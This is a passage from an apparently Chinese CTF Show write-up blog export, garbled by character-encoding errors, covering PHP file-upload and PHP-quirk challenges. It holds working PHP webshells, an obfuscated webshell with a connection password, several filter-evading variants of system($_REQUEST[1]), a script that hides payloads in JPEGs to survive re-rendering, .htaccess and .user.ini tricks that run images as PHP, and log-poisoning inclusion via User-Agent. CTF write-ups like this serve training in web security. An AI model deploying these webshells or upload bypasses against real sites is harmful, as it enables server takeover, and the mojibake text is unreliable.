new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125; //ä½¿ç”¨æ–¹æ³• php exp.php 1.jpg?&gt; 1.13 Web 166 â€” zip æ–‡ä»¶ä¸Šä¼  1# Content-Type: application/x-zip-compressed å°†ä¸€å¥è¯æœ¨é©¬åç¼€æ›´æ”¹ä¸º zip ä¸Šä¼ å³å¯ï¼ŒæŸ¥çœ‹æ–‡ä»¶ 1/upload/download.php?file=9643f09dfc5004a1dc73f4c025f084d2.zip å°†ä»£ç æ›´æ”¹å³å¯ 1.14 Web 167 â€” .htaccess1httpd å°è¯• jpg æ–‡ä»¶æˆåŠŸä¸Šä¼ ä¹‹åå‘ç°æœåŠ¡å™¨æ˜¯ Apache ï¼Œå†æ ¹æ®æç¤ºï¼Œå°è¯•ä¸Šä¼  .htaccess æˆåŠŸä¸Šä¼  1# ä¸Šä¼  111.png&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt; ä¹‹åè®¿é—® /upload/111.png èšå‰‘è¿æ¥å³å¯ 1.15 Web 168 â€” å…æ€ä»£ç 1åŸºç¡€å…æ€# è¿‡æ»¤äº† eval , system , $_POST , $_GET ç­‰ 1# å¯ä½¿ç”¨åå¼•å·&lt;?=`ls /var/www/html`?&gt; #flag.php flagaa.php images index.php js layui upload upload.php &lt;?=`cat /var/www/html/flagaa.php`?&gt; 1# å…¶å®ƒç»•è¿‡æ–¹å¼ 1&lt;?php // ä½¿ç”¨æ—¶è¯·åˆ é™¤æ­¤è¡Œ, è¿æ¥å¯†ç : TyKPuntU ?&gt;&lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#x27;bw==&#x27;).base64_decode(&#x27;bQ==&#x27;).base64_decode(&#x27;ZQ==&#x27;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#x27;YQ==&#x27;).base64_decode(&#x27;bA==&#x27;).chr(060340/01154).chr(01041-0775).base64_decode(&#x27;cw==&#x27;).str_rot13(&#x27;b&#x27;).chr(01504-01327).base64_decode(&#x27;ZQ==&#x27;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#x27;NjgxO&#x27;.&#x27;Tc7QG&#x27;.&#x27;V2QWw&#x27;.&#x27;oJF9Q&#x27;.&#x27;&#x27;.str_rot13(&#x27;G&#x27;).str_rot13(&#x27;1&#x27;).str_rot13(&#x27;A&#x27;).base64_decode(&#x27;VQ==&#x27;).str_rot13(&#x27;J&#x27;).&#x27;&#x27;.&#x27;&#x27;.chr(0x304-0x2d3).base64_decode(&#x27;Ug==&#x27;).chr(13197/249).str_rot13(&#x27;F&#x27;).base64_decode(&#x27;MQ==&#x27;).&#x27;&#x27;.&#x27;B1bnR&#x27;.&#x27;VXSk7&#x27;.&#x27;MjA0N&#x27;.&#x27;TkxOw&#x27;.&#x27;==&#x27;.&#x27;&#x27;));?&gt; 1&lt;?php$a = &quot;s#y#s#t#e#m&quot;;$b = explode(&quot;#&quot;,$a);$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];$c($_REQUEST[1]);?&gt; 1&lt;?php$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;$a($_REQUEST[1]);?&gt; 1&lt;?php$a=strrev(&#x27;metsys&#x27;);$a($_REQUEST[1]);?&gt; 1&lt;?php$a=$_REQUEST[&#x27;a&#x27;];$b=$_REQUEST[&#x27;b&#x27;];$a($b);?&gt; 1&lt;?=`$_REQUEST[1]`;?&gt;# åˆ©ç”¨åå¼•å·æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 1&lt;?php $a=&#x27;syste&#x27;.&#x27;m&#x27;;($a)(&#x27;ls ../&#x27;);# æ‹¼æ¥ 1&lt;?php$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;abs&#125;)($$pi&#123;acos&#125;);# getä¼ å‚ abs=system&amp;acos=ls# æ•°å­¦å‡½æ•° 1.16 Web 169-170 â€” æ—¥å¿—åŒ…å«ï¼ˆæœªè¿‡æ»¤ logï¼‰1é«˜çº§å…æ€ 1# å‰ç«¯åšäº† .zip æ£€æŸ¥# åç«¯åšäº† Content-Type æ£€æŸ¥ è®¿é—® 1.php ï¼Œæˆ‘ä»¬å¿…é¡»è‡ªå·±ä¸Šä¼ ä¸€ä¸ª .php æ–‡ä»¶ 1system(&#x27;ls ../&#x27;); 1system(&#x27;cat ../flagaa.php&#x27;); äºŒã€æ€»ç»“ æ‰¾åˆ°å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ï¼ŒæŠ“åŒ… åœ¨ Content-Type æ­£ç¡®çš„æƒ…å†µä¸‹ï¼Œé¦–å…ˆå°è¯•ç›´æ¥æ›´æ”¹ åç¼€ä¸º .php ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ ä¸Šè¿°ä¸å…è®¸çš„æƒ…å†µä¸‹ï¼Œè§‚å¯ŸæœåŠ¡å™¨ç±»å‹ï¼Œnginx å°è¯• .user.ini ï¼ŒApache å°è¯• .htaccess ```bash.user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log123+ ```bash # .htaccessAddType application/x-httpd-php .png # ç‰¹å®šæ–‡ä»¶åç¼€å½“ä½œ php æ–‡ä»¶å¤„ç†AddHandler php5-script php # åŒ…å«å…³é”®å­—çš„æ–‡ä»¶åå½“ä½œ php æ–‡ä»¶å¤„ç†&lt;FilesMatch &quot;æ–‡ä»¶å&quot;&gt; # ç‰¹å®šæ–‡ä»¶åå½“ä½œ php æ–‡ä»¶å¤„ç†SetHandler application/x-httpd-php&lt;/FilesMatch&gt;SetHandler application/x-httpd-php #æ‰€æœ‰æ–‡ä»¶åç¼€éƒ½å½“ä½œ php æ–‡ä»¶å¤„ç† .user.ini æ³¨æ„è¯¥ç›®å½•ä¸‹æ˜¯å¦å·²ç»å«æœ‰ .php æ–‡ä»¶ è¿‡æ»¤ php 1# å¤§å°å†™ç»•è¿‡# çŸ­æ ‡ç­¾ è¿‡æ»¤ [] 1# &#123;&#125; ç»•è¿‡ è¿‡æ»¤ åˆ†å· ; 1# å‘½ä»¤æ‰§è¡Œ&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt; æ—¥å¿—åŒ…å« 1è¿‡æ»¤ log Web 160# ä¸Šä¼  .user.iniauto_prepend_file=123.png# ä¸Šä¼  123.pngï¼Œåœ¨å…¶ä¸­è¿›è¡Œæ‹¼æ¥# nginx æœåŠ¡å™¨&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# ç”±äº log è¢«è¿‡æ»¤ï¼Œè¿›è¡Œæ‹¼æ¥&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;# è®¿é—® /upload/index.php æŠ“åŒ…åœ¨ User-Agent ä¸­æ·»åŠ æ¶æ„ä»£ç  &lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; ï¼Œè®¿é—® 1æœªè¿‡æ»¤ log Web 169 170# ä¸Šä¼  .user.iniauto_prepend_file=/var/log/nginx/access.log# ä¸Šä¼  .php æ–‡ä»¶ï¼ŒåŒæ—¶ User-Agent å†™å…¥ ä»£ç  &lt;?php phpinfo(); ?&gt;&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;å†…å®¹éšæ„# è®¿é—®ï¼Œå‘½ä»¤æ‰§è¡Œ .user.ini ä¸Šä¼ ä¸äº†ï¼Ÿå°è¯•æ–‡ä»¶å¤´å†™å…¥ 1GIF89a è¿‡æ»¤ . Web 162-163 1# å³ä¸èƒ½åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼Œåˆ™åŒ…å« session æ–‡ä»¶# ä¸Šä¼  .user.iniGIF89aauto_prepend_file=test# ä¸Šä¼  testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;# æ„é€  POST æ•°æ®åŒ…&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# ä»»æ„ä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹ï¼ŒPHPSESSID=testï¼Œå†™å…¥ä»£ç æ·»å…¥å˜é‡ Numbers çˆ†ç ´# è®¿é—® /upload/index.php æ·»å…¥å˜é‡ Numbers åŒæ—¶çˆ†ç ´ äºŒæ¬¡æ¸²æŸ“ Web 164 165 1png å›¾ç‰‡# è„šæœ¬ç”Ÿæˆå›¾ç‰‡ä¸Šä¼ ï¼Œè®¿é—®ï¼Œå‘½ä»¤æ‰§è¡Œ &lt;?=$_GET[0]($_POST[1]);?&gt;# ä¸‹è½½è‡³æœ¬åœ°æŸ¥çœ‹ï¼ˆæ–‡ä»¶åŒ…å«ï¼‰ 1jpg å›¾ç‰‡# ç›´æ¥ä¸Šä¼  jpg å›¾ç‰‡ï¼Œä¸‹è½½å›æ¥ï¼Œä½¿ç”¨è„šæœ¬å¤„ç†ï¼Œå¾—åˆ°æ–°çš„ jpg å›¾ç‰‡ï¼Œå†æ¬¡ä¸Šä¼ # ä¸‹è½½è‡³æœ¬åœ°æŸ¥çœ‹ï¼ˆæ–‡ä»¶åŒ…å«ï¼‰ åç¼€ç±»å‹ä¸å¯çŒœæµ‹æ—¶ï¼Œ.zip æ–‡ä»¶ä¸Šä¼  Web 166 1# ä¸Šä¼  .zip æ–‡ä»¶æŠ“åŒ… Content-Type: application/x-zip-compressed# å†…å®¹ç›´æ¥æ˜¯æ¶æ„ä»£ç # æ‰¾åˆ° .zip æ–‡ä»¶è·¯å¾„ï¼Œè¿›è¡ŒæŸ¥çœ‹# å‘½ä»¤æ‰§è¡Œ å…æ€ Web 168 å‰ç«¯åšåç¼€æ£€æµ‹ï¼Œåç«¯åšä¸åŒåç¼€çš„ Content-Type æ£€æµ‹ æ³¨æ„æŠ“åŒ…åä¿®æ”¹ Content-Type ä¸ºç™½åå•","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-PHPç‰¹æ€§","slug":"CTF-Show-PHPç‰¹æ€§","date":"2021-10-01T11:15:08.000Z","updated":"2021-10-01T11:16:09.641Z","comments":true,"path":"2021/10/01/CTF-Show-PHPç‰¹æ€§/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/","excerpt":"CTF Show PHP ç‰¹æ€§ç¯‡ã€‚","text":"CTF Show PHP ç‰¹æ€§ç¯‡ã€‚ ä¸€ã€CTF Show PHPç‰¹æ€§1.1 Web 89 â€” intval æ•°ç»„ [ ] ç»•è¿‡12345678910111213&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 1?num[]=1 #æ•°ç»„ç»•è¿‡ 1.2 Web 90 â€” intval å–æ•´ â€” intval(â€˜4476sasaSâ€™,0)===44761234567891011121314&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 12345678intval ( mixed $var [, int $base = 10 ] ) : intNote:å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼šå¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† &quot;0x&quot; (æˆ– &quot;0X&quot;) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œå¦‚æœå­—ç¬¦ä¸²ä»¥ &quot;0&quot; å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œå°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚ 123456intval(&#x27;4476.0&#x27;)===4476 å°æ•°ç‚¹ intval(&#x27;+4476.0&#x27;)===4476 æ­£è´Ÿå·intval(&#x27;4476e0&#x27;)===4476 ç§‘å­¦è®¡æ•°æ³•intval(&#x27;0x117c&#x27;)===4476 16è¿›åˆ¶intval(&#x27;010574&#x27;)===4476 8è¿›åˆ¶intval(&#x27; 010574&#x27;)===4476 8è¿›åˆ¶+ç©ºæ ¼ 123if(intval(&#x27;4476sasaS&#x27;,0)===4476)&#123; echo &#x27;123&#x27;;&#125; 1?num=4476asd 1.3 Web 91 â€” æ­£åˆ™ç»•è¿‡ â€” /m æ¢è¡ŒåŒ¹é…1234567891011121314151617&lt;?phpshow_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125;Notice: Undefined index: cmd in /var/www/html/index.php on line 15nonononono 1# è§£ææ¢è¡Œä¹‹åè¦åŒ¹é…åˆ° phpä¸æ¢è¡Œä¸èƒ½åŒ¹é…åˆ° php 1i ä¸åŒºåˆ†(ignore)å¤§å°å†™må¤š(more)è¡ŒåŒ¹é…è‹¥å­˜åœ¨æ¢è¡Œ\\nå¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œå°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…$str = &quot;abc\\nabc&quot;;$preg = &quot;/^abc$/m&quot;;preg_match($preg, $str,$matchs);è¿™æ ·å…¶å®æ˜¯ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„ï¼Œå› ä¸ºåŒ¹é…çš„æ—¶å€™ å…ˆæ˜¯åŒ¹é…æ¢è¡Œç¬¦å‰é¢çš„ï¼Œæ¥ç€åŒ¹é…æ¢è¡Œç¬¦åé¢çš„ï¼Œä¸¤ä¸ªéƒ½æ˜¯abcæ‰€ä»¥å¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ã€‚sç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ . ä¸­åŒ…å«æ¢è¡Œç¬¦é»˜è®¤çš„åœ†ç‚¹ . æ˜¯åŒ¹é…é™¤æ¢è¡Œç¬¦ \\n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ï¼ŒåŠ ä¸Šsä¹‹å, .åŒ…å«æ¢è¡Œç¬¦$str = &quot;abggab\\nacbs&quot;;$preg = &quot;/b./s&quot;;preg_match_all($preg, $str,$matchs);è¿™æ ·åŒ¹é…åˆ°çš„æœ‰ä¸‰ä¸ª bg b\\n bsAå¼ºåˆ¶ä»ç›®æ ‡å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…;Då¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ; eé…åˆå‡½æ•°preg_replace()ä½¿ç”¨, å¯ä»¥æŠŠåŒ¹é…æ¥çš„å­—ç¬¦ä¸²å½“ä½œæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ; 1# ç›´æ¥ä½¿ç”¨æ¢è¡Œç¬¦å·åˆ†å‰²å³å¯# %0a æ˜¯ æ¢è¡Œç¬¦?cmd=%0aphp 1.4 Web 92 â€” intval å¯è§£æåå…­è¿›åˆ¶ã€å…«è¿›åˆ¶1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 1?num=0x117c #åå…­è¿›åˆ¶ Hex?num=010574 #å…«è¿›åˆ¶ oct?num=%20010574# ?num=4476sqs ä¸è¡Œï¼Œç”±äº $num==4476 1.5 Web 93 â€” å…«è¿›åˆ¶ä¸å«å­—æ¯ï¼Œåå…­è¿›åˆ¶å«å­—æ¯1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 1?num=010574 #oct 1.6 Web 94 â€” æ­£åˆ™ç»•è¿‡ â€” %20 %0a1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 1#0åœ¨å…¶ä¸­çš„ä½ç½®ä¸èƒ½æ˜¯0ï¼Œå³æœ€å¼€å§‹ï¼Œå³ä¸èƒ½ä»¥0å¼€å¤´?num=%0a010574?num=4476.0?num=%20010574 1.7 Web 95 â€” æ­£åˆ™ç»•è¿‡1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 1?num=%0a010574?num=%20010574?num=+010574 1.8 Web 96 â€” è·¯å¾„ä¹¦å†™1&lt;?php highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123; if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123; die(&quot;no no no&quot;); &#125;else&#123; highlight_file($_GET[&#x27;u&#x27;]); &#125;&#125; 1?u=./flag.php #è·¯å¾„?u=/var/www/html/flag.php?u=php://filter/resource=flag.php 1.9 Web 97 â€” md5 æ•°ç»„ [ ] ç»•è¿‡ â€” if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; 1a[]=1&amp;b[]=2 1.10 Web 98 â€” ä¸‰ç›®è¿ç®—ç¬¦ã€å˜é‡è¦†ç›–1&lt;?php include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt; 1#ä¸‰ç›®è¿ç®—ç¬¦ä»¥åŠå˜é‡è¦†ç›–è‹¥GETä¼ å‚ï¼ŒPOSTå€¼å°†è¦†ç›–GETå€¼ 1getä¼ å‚ï¼š?flag=1postä¼ å‚ï¼š?HTTP_FLAG=flag 1.11 Web 99 â€” file_put_contents1&lt;?php highlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123; file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt; 1å½“æ²¡æœ‰ç¬¬ä¸‰ä¸ªå‚æ•°æ—¶ï¼Œin_arrayä¹‹ä¸­çš„æ¯”è¾ƒä¸ == ä¸€è‡´å½“ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º true æ—¶ï¼Œin_arrayä¹‹ä¸­çš„æ¯”è¾ƒä¸ === ä¸€è‡´$allow = array(1,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#ç±»å‹ä¸åŒï¼Œé¦–å…ˆè½¬æ¢ï¼Œè¿”å› true$allow = array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#ç±»å‹ä¸€è‡´ï¼Œç›´æ¥æ¯”è¾ƒï¼Œè¿”å›false 1# payload?n=1.phpcontent=&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt; è®¿é—® /1.php 1.12 Web 100 â€” eval(â€œ$v2(â€˜ctfshowâ€™)$v3â€);1&lt;?php highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\;/&quot;, $v2))&#123; if(preg_match(&quot;/\\;/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; æµ‹è¯•ï¼š 1&lt;?phpvar_dump(true and true and false); // falsevar_dump(true and false and false);// falsevar_dump(true &amp;&amp; true &amp;&amp; false);// falsevar_dump(true &amp;&amp; false &amp;&amp; false);// false$a=true and false and false;var_dump($a); // true$b = true &amp;&amp; false &amp;&amp; false;var_dump($b); //false$c = true &amp; false &amp; false;var_dump($c); //bool(0) 1&lt;?php$a=true and false and false;var_dump($a); // trueif($a === true and false and false)&#123; echo &#x27;111&#x27;; //ä¸è¾“å‡º&#125; 1&lt;?php$a=false and true and true;var_dump($a); if($a == false and true and true)&#123; echo &#x27;111&#x27;; &#125;//bool(false) 111 11. if($v0)ç»•è¿‡ï¼šv1 æ˜¯æ•°å­—2. v2 ä¸èƒ½æœ‰åˆ†å·ï¼Œé‚£ä¹ˆæ— æ³•ä½¿ç”¨ å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œé‚£ä¹ˆä½¿ç”¨ ``3. ä½¿ç”¨æ³¨é‡Šå°† v3 æ³¨é‡Šæ‰ï¼Œç›¸å½“äºæŠŠ (&#x27;ctfshow&#x27;) æ³¨é‡Šæ‰4. æ³¨æ„ï¼Œv3 ä¸€å®šè¦å†™ä¸Š ; 1# payload?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=?&gt;&lt;?php echo `cat ctfshow.php`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=-system(&#x27;ls&#x27;)-&amp;v3=-1;?v1=1&amp;v2=echo&amp;v3=;system(&#x27;ls&#x27;); æ„é€ æˆä¸‹é¢çš„æ„Ÿè§‰ æŸ¥ ctfshow.php è¯•è¯• å…¶ä¸­ï¼Œ0x2d æ˜¯ - 1.13 Web 101 â€” ReflectionClass å…³äºä¸€ä¸ªç±»çš„åå°„http://www.thinkphp.cn/code/4863.html 1ä¿®è¡¥100é¢˜éé¢„æœŸ,æ›¿æ¢0x2d 1&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; ä¸Šé¢çš„ v2 æ„é€ çš„ç¬¦å· è¢«è¿‡æ»¤ æ„é€  eval(echo new ReflectionClass(â€˜ctfshowâ€™)); 1?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; 1.14 Web 1021&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = 